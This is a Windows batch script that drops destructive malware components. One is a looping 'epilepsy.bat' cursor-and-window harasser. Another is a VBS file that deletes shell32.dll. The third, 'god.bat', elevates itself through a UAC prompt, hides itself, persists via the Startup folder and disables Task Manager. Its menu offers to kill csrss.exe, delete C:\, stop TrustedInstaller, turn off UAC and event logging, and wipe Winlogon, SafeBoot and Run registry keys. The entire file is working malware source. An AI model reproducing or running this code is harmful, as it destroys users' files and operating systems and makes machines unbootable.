@echo off
setlocal

md "%temp%\ImportantFolders" 2>nul

(
echo @echo off
echo title epilepsy.bat
echo color 0a
echo :loop
echo powershell -command ^
echo   "$sig=@'[DllImport(\"user32.dll\")]^public static extern bool SetCursorPos(int X, int Y);'@; ^
echo   $type=Add-Type -MemberDefinition $sig -Name NativeMethods -Namespace Win32 -PassThru; ^
echo   for($x=0; $x -le 500; $x+=20){ ^
echo     $y = [Math]::Round(250 + 100 * [Math]::Sin($x/50 * [Math]::PI)); ^
echo     $type::SetCursorPos($x,$y); Start-Sleep -Milliseconds 50 ^
echo   }"
echo start control.exe
echo timeout /t 1 /nobreak >nul
echo goto loop
) > "%temp%\epilepsy.bat"

(
echo Set fso = CreateObject("Scripting.FileSystemObject")
echo iconPath = "%SystemRoot%\System32\shell32.dll,3"
echo For Each file In fso.GetFolder("%temp%").Files
echo   If LCase(fso.GetExtensionName(file.Name)) = "lnk" Then
echo     Set shell = CreateObject("WScript.Shell")
echo     Set shortcut = shell.CreateShortcut(file.Path)
echo     shortcut.IconLocation = iconPath
echo     shortcut.Save
echo   End If
echo Next
echo Set shell = CreateObject("WScript.Shell")
echo shell.Run "takeown /f %SystemRoot%\System32\shell32.dll /a /r /d y", 0, True
echo shell.Run "icacls %SystemRoot%\System32\shell32.dll /grant administrators:F /t", 0, True
echo shell.Run "del /f /q %SystemRoot%\System32\shell32.dll", 0, True
) > "%temp%\9999999999.vbs"

md "%~dp0setup" 2>nul

(
echo @echo off
echo REM Core placeholder for god.bat
) > "%~dp0setup\bttoleofwaermate.bat"

type nul > "%~dp0setup\godfiles.tmp"

(
echo @echo off
echo ^>nul 2^>^&1 "%%SYSTEMROOT%%\system32\cacls.exe" "%%SYSTEMROOT%%\system32\config\system"
echo if '%%errorlevel%%' NEQ '0' (
echo     echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c %%%%~s0", "", "runas", 1 ^> "%%%%temp%%%%\getadmin.vbs"
echo     "%%%%temp%%%%\getadmin.vbs"
echo     del "%%%%temp%%%%\getadmin.vbs"
echo     exit /b
echo )
echo title GOD.BAT
echo color 0c
echo cd /d "%%%%~dp0"
echo attrib +s +h "%%%%~f0"
echo set "startup=%%%%APPDATA%%%%\Microsoft\Windows\Start Menu\Programs\Startup"
echo copy "%%%%~f0" "%%%%startup%%%%\god.bat" ^>nul
echo takeown /f "%%%%~f0" ^>nul
echo icacls "%%%%~f0" /setowner "WDAGUtilityAccount" ^>nul
echo icacls "%%%%~f0" /inheritance:r ^>nul
echo icacls "%%%%~f0" /grant:r "WDAGUtilityAccount:F" ^>nul
echo REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo echo Select an option:
echo echo 1. Open URLs in every installed browser
echo echo 2. Open Wikipedia System Crash page
echo echo 3. Rickroll + VBS malware
echo echo 4. Disable TrustedInstaller and run epilepsy.bat
echo echo 5. Kill csrss.exe
echo echo 6. Delete C:\
echo echo 7. Nuke MBR with message
echo echo 8. Corrupt registry
echo set /p choice=Enter your choice [1-8]:
echo if "%%%%choice%%%%"=="1" (
echo     setlocal EnableDelayedExpansion
echo     set "urls=https://www.google.com https://bing.com https://youtube.com"
echo     set "chrome=%%ProgramFiles%%\Google\Chrome\Application\chrome.exe"
echo     set "chrome_x86=%%ProgramFiles(x86)%%\Google\Chrome\Application\chrome.exe"
echo     set "firefox=%%ProgramFiles%%\Mozilla Firefox\firefox.exe"
echo     set "firefox_x86=%%ProgramFiles(x86)%%\Mozilla Firefox\firefox.exe"
echo     set "edge=%%ProgramFiles(x86)%%\Microsoft\Edge\Application\msedge.exe"
echo     set "edge64=%%ProgramFiles%%\Microsoft\Edge\Application\msedge.exe"
echo     set "opera=%%ProgramFiles%%\Opera\launcher.exe"
echo     set "opera_x86=%%ProgramFiles(x86)%%\Opera\launcher.exe"
echo     set "brave=%%ProgramFiles%%\BraveSoftware\Brave-Browser\Application\brave.exe"
echo     set "brave_x86=%%ProgramFiles(x86)%%\BraveSoftware\Brave-Browser\Application\brave.exe"
echo     for %%%%B in (
echo         "%%%%chrome%%%%"
echo         "%%%%chrome_x86%%%%"
echo         "%%%%firefox%%%%"
echo         "%%%%firefox_x86%%%%"
echo         "%%%%edge%%%%"
echo         "%%%%edge64%%%%"
echo         "%%%%opera%%%%"
echo         "%%%%opera_x86%%%%"
echo         "%%%%brave%%%%"
echo         "%%%%brave_x86%%%%"
echo     ) do (
echo         if exist %%%%~B (
echo             for %%%%U in (!urls!) do (
echo                 start "" "%%%%~B" "%%%%U"
echo             )
echo         )
echo     )
echo     endlocal
echo     goto :eof
echo )
echo if "%%%%choice%%%%"=="2" (
echo     start https://en.wikipedia.org/wiki/System_crash
echo     goto :eof
echo )
echo if "%%%%choice%%%%"=="3" (
echo     start https://www.youtube.com/watch?v=dQw4w9WgXcQ
echo     start "" "%%%%temp%%%%\9999999999.vbs"
echo     goto :eof
echo )
echo if "%%%%choice%%%%"=="4" (
echo     sc config TrustedInstaller start= disabled
echo     sc stop TrustedInstaller
echo     start "" "%%%%temp%%%%\epilepsy.bat"
echo     goto :eof
echo )
echo if "%%%%choice%%%%"=="5" (
echo     taskkill /f /im csrss.exe
echo     goto :eof
echo )
echo if "%%%%choice%%%%"=="6" (
echo     rd /s /q C:\
echo     goto :eof
echo )
echo if "%%%%choice%%%%"=="7" (
echo     echo Hello user, your PC has been nuked with the russian pack 101 > "%%%%temp%%%%\mbrmsg.txt"
echo     msg * "Hello user, your PC has been nuked with the russian pack 101"
echo     goto :eof
echo )
echo if "%%%%choice%%%%"=="8" (
echo     REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
echo     REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f
echo     REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
echo     REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\EventLog" /v Start /t REG_DWORD /d 4 /f
echo     REG DELETE "HKCU\Control Panel\Desktop" /f
echo     REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
echo     REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /f
echo     REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /f
echo     REG DELETE "HKLM\SYSTEM\CurrentControlSet\Services\W32Time" /f
echo     REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
echo     REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo     REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
echo     goto :eof
echo )
echo echo Invalid choice.
) > "%~dp0god.bat"

endlocal
